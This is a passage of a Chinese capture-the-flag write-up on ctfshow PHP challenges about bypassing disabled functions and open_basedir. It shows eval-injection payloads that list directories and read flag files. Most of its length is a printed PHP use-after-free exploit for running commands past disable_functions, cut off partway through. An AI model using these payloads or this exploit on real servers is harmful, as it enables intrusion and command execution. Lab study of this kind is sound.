<p>题面一致，过滤掉了print_r()，它的类似功能函数是var_dump</p>
<p>扫描目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=var_dump(scandir(&#x27;/&#x27;));<br></code></pre></td></tr></table></figure>
<p>扫出flag.txt</p>
<p>直接文件包含即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
<p>题面直接报错，不过应该还是之前的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19<br></code></pre></td></tr></table></figure>
<p>az，自己ban自己？</p>
<p>还是上一题payload</p>
</li>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
<p>题面与上一题一致</p>
<p>var_dump()也给过滤了</p>
<p>这里该列一下读取目录的一些方式了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;*&quot;</span>)); <span class="hljs-comment">// 列当前目录</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/*&quot;</span>)); <span class="hljs-comment">// 列根目录</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span>!==(<span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$d</span>)))&#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$f</span>\n&quot;</span>;&#125;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span>!==(<span class="hljs-variable">$f</span>=<span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">read</span>()))&#123;<span class="hljs-keyword">echo</span><span class="hljs-variable">$f</span>.<span class="hljs-string">&quot;\n&quot;</span>;&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&quot;/*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;   &quot;</span>;&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot; &quot;</span>);&#125;<br><br><span class="hljs-comment">// 后面几个其实主要用到echo 可以输出这个目录条目的特点</span><br></code></pre></td></tr></table></figure>
<p>然后依然文件包含即可</p>
</li>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
<p>我去题面本身禁用的函数更多了，不过不影响payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14<br><br>Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15<br><br>Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21<br>你要上天吗？<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
<p>题面一致，这次给了题面源码，审一波</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();	<span class="hljs-comment">// 返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();	<span class="hljs-comment">// 清空（擦除）缓冲区并关闭输出缓冲</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><code>ob_get_contents()</code>会截获缓冲区的内容，并且通过正则替换，所有字符串中的数字和字母将被替换为?</p>
<p>针对<code>ob_end_clean()</code>，官网提到<code>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</code>。也就是说，一切祸源于ob_end_clean()，也就是说我们想要阻止该函数关闭缓冲区，提前退出程序不就行了！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=include(&quot;/flag.txt&quot;);exit();<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>命令执行，突破禁用函数，求你们别秀了</strong> <strong>突破open_basedir限制</strong></p>
<p>题面一致，依然给了代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>看起来和上一题没啥变化，应该就是在过滤函数上增加了</p>
<p>先扫目录，先尝试上一题的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;<br>-----------------------------------------------------------------------------------<br>疯狂报Warning: readdir() expects parameter 1 to be resource, bool given in /var/www/html/index.php(19) : eval()&#x27;d code on line 1<br></code></pre></td></tr></table></figure>
<p>换<strong>payload</strong>，根目录下存在flag0.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit;<br>flag0.txt<br></code></pre></td></tr></table></figure>
<p>尝试直接包含，报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Warning: include(flag0.txt): failed to open stream: No such file or directory in /var/www/html/index.php(19) : eval()&#x27;d code on line 1<br>Warning: include(): Failed opening &#x27;flag0.txt&#x27; for inclusion <br>(include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php(19) : eval()&#x27;d code on line 1<br></code></pre></td></tr></table></figure>
<p>原来是有open_basedir的限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。<br>当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开<br></code></pre></td></tr></table></figure>
<p>学习P神14年的研究（666）</p>
<p>原来php5.3之后有了DirectoryIterator这个类方便直接去遍历目录，且可以无视open_basedir的限制</p>
<p>不过后面命令执行就不清楚了，直接脚本小子…（据说是uaf堆漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span 